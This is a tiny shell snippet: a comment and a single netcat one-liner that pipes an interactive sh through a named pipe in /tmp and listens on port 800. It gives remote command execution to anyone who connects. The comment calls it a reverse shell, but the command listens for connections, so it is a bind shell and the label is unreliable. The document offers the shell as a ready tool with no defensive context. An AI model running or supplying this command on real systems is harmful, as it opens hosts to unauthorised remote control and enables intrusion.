#This reverse shell allows for remote execution unlike the pipe shell
rm -f /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe | sh -i 2>&1 | nc -lvp 800 > /tmp/pipe
